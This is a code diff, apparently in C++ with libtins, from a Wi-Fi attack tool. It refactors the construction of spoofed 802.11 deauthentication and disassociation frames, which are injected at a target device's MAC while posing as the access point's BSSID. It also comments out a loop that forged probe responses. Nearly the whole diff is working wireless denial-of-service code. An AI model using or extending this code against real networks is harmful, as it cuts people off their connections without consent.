@@ -43,18 +43,17 @@ void injectPacket(PDU *pdu, pcap_t *handle)
 	}
 }
 
-auto deauthFactory(HWAddress<6> target_mac, HWAddress<6> source_mac, int channel)
+template <typename Packet>
+RadioTap constructManagementFrameWithReasonCode(HWAddress<6> target_mac, HWAddress<6> source_mac, int channel, int reason_code)
 {
-	Dot11Deauthentication deauth;
-	deauth.reason_code(0x07);
+	Packet mgnt;
+	mgnt.reason_code(reason_code);
 
-	deauth.addr1(target_mac);	  // set device mac address
-	deauth.addr2(source_mac);	  // set ap mac address
-	deauth.addr3(deauth.addr2()); // set bssid (optional)
+	mgnt.addr1(target_mac);	  // set device mac address
+	mgnt.addr2(source_mac);	  // set ap mac address
+	mgnt.addr3(mgnt.addr2()); // set bssid (optional)
 
-	deauth.reason_code(1);
-
-	RadioTap radio = RadioTap() / deauth; // make 802.11 packet
+	RadioTap radio = RadioTap() / mgnt; // make 802.11 packet
 
 	radio.channel(ieee80211_channel_to_frequency(channel, channel <= 14 ? NL80211_BAND_2GHZ : NL80211_BAND_5GHZ),
 				  channel <= 14 ? RadioTap::ChannelType::TWO_GZ : RadioTap::ChannelType::FIVE_GZ);
@@ -147,57 +146,43 @@ public:
 						}
 
 						{
-							Dot11Deauthentication deauth;
-							deauth.reason_code(0x07);
-
-							deauth.addr1(config.target_mac); // set device mac address
-							deauth.addr2(ap.bssid);			 // set ap mac address
-							deauth.addr3(deauth.addr2());	 // set bssid (optional)
-
-							RadioTap radio = RadioTap() / deauth; // make 802.11 packet
-
-							radio.channel(ieee80211_channel_to_frequency(channel, channel <= 14 ? NL80211_BAND_2GHZ : NL80211_BAND_5GHZ),
-										  channel <= 14 ? RadioTap::ChannelType::TWO_GZ : RadioTap::ChannelType::FIVE_GZ);
-
-							radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);
+							auto radio = constructManagementFrameWithReasonCode<Dot11Disassoc>(
+								config.target_mac,
+								ap.bssid,
+								channel,
+								7 // INVALID_CLASS3_FRAME
+							);
 
 							injectPacket(&radio, psniffer->get_pcap_handle());
 						}
 
 						{
-							Dot11Disassoc disassoc;
-							disassoc.reason_code(0x01);
-
-							disassoc.addr1(config.target_mac); // set device mac address
-							disassoc.addr2(ap.bssid);			 // set ap mac address
-							disassoc.addr3(disassoc.addr2());	 // set bssid (optional)
-
-							RadioTap radio = RadioTap() / disassoc; // make 802.11 packet
-
-							radio.channel(ieee80211_channel_to_frequency(channel, channel <= 14 ? NL80211_BAND_2GHZ : NL80211_BAND_5GHZ),
-										  channel <= 14 ? RadioTap::ChannelType::TWO_GZ : RadioTap::ChannelType::FIVE_GZ);
-
-							radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);
+							auto radio = constructManagementFrameWithReasonCode<Dot11Deauthentication>(
+								config.target_mac,
+								ap.bssid,
+								channel,
+								6 // INVALID_CLASS2_FRAME
+							);
 
 							injectPacket(&radio, psniffer->get_pcap_handle());
 						}
 
-						if (ap.resp)
-							for (int i = 0; i < 4; i++)
-							{
-								auto &resp = *ap.resp;
+						// if (ap.resp)
+						// 	for (int i = 0; i < 4; i++)
+						// 	{
+						// 		auto &resp = *ap.resp;
 
-								auto addr = resp.addr2();
-								addr[5] = addr[5] * 61 + 2;
-								resp.addr1(config.target_mac);
-								resp.addr2(addr);
-								resp.addr3(addr);
+						// 		auto addr = resp.addr2();
+						// 		addr[5] = addr[5] * 61 + 2;
+						// 		resp.addr1(config.target_mac);
+						// 		resp.addr2(addr);
+						// 		resp.addr3(addr);
 
-								RadioTap radio = RadioTap() / resp; // make 802.11 packet
-								radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);
+						// 		RadioTap radio = RadioTap() / resp; // make 802.11 packet
+						// 		radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);
 
-								injectPacket(&radio, psniffer->get_pcap_handle());
-							}
+						// 		injectPacket(&radio, psniffer->get_pcap_handle());
+						// 	}
 
 						// std::this_thread::sleep_for(std::chrono::milliseconds(2));
 					}
